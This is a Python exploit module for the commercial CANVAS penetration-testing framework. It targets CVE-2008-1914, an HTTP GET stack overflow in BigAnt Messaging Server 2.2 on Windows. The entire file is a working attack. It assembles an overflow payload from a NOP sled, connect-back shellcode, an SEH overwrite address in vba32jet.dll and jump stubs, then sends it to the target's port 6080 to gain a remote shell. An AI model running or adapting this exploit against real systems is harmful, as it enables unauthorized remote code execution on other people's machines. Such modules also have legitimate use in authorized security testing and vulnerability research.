#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *
from MOSDEF import mosdef

from tcpexploit import tcpexploit
import canvasengine
import time

from shellcode import shellcodeGenerator
from encoder import xorencoder
from MOSDEF import mosdef

NAME="Big Ant Messaging Server 2.2 - HTTP GET Stack Overflow"
DESCRIPTION="Big Ant Messenging Server 2.2 - HTTP GET Stack Overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='BigAnt'
DOCUMENTATION['Date public']='04/18/08'
DOCUMENTATION['References']='http://osvdb.org/show/osvdb/44454'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['CVE Name'] = 'CVE-2008-1914'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1914'
DOCUMENTATION['CVSS'] = 10.0

DOCUMENTATION['Note']=''

VERSION = "1.0"
GTK2_DIALOG = "dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP","2003" ]

NOTES = """
"""

CHANGELOG = """
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port      = 6080
        self.host      = ""
        self.shellcode = "\xcc" * 298
        self.badstring = "\x00\x0a\x0d\x5c\x02\x2e\x5f\x2f\x20\x25"
        self.setVersions()
        self.version   = 1
        self.name      = NAME        
        self.result    = 1

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions = {}
        
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[0] = ("Autoversion",     0x0F9A196A)
        self.versions[1] = ("Windows XP SP 2", 0x0F9A196A)   # pop, pop, ret in vba32jet.dll
        self.versions[2] = ("Windows 2000 SP4",0x0F9A196A)

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host = self.callback.ip
        port = self.callback.port
                   
        return self.createWin32Shellcode(self.badstring, host, port)
            
    def test(self):
        """
        Testing function.
        """
        self.getargs()
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except Exception:
            self.log("No connection could be established")
            return 0
        return 1
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            s = self.gettcpsock()
            s.connect((self.host, self.port))
            
        except Exception:
            self.log("Could not connect")
            self.setInfo("%s attacking %s:%d - done (failed: could not connect!)"%(NAME,self.host,self.port))
            self.result = 0
            return self.result
        
        s.sendall(sploitstring)
        try:
            s.recv(1)
        except Exception:
            pass
        
        s.close()
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return self.result
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))            
        
        return self.result
        
    def makesploit(self):
        """
        Construct the attack
        """
        geteip=self.versions[self.version][1]
        shellcode = self.createShellcode()
        self.log("Shellcode length: %d" % len(shellcode))
        self.log("Shellcode: %s" % shellcode.encode("HEX"))
        
        diff      = 949 - len(shellcode)
        
        sploitstring = "GET "
        sploitstring += "\x90" * diff
        sploitstring += shellcode 
        sploitstring += "\x90"
        sploitstring += "\xeb\x06\x90\x90"
        sploitstring += struct.pack("<L",geteip) 
        sploitstring += "\x90" * 12
        sploitstring += "\x90\x90\x90\x90"                                                  
        sploitstring += "\x90" * 4
        sploitstring += mosdef.assemble('jmp $-%d'%(len(sploitstring)),'x86')
        sploitstring += "A" * 2000
        sploitstring = sploitstring[0:2207]
        sploitstring += "\n\n"      
        self.log("Sploitstring len: %d" % len(sploitstring))
               
        return sploitstring



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
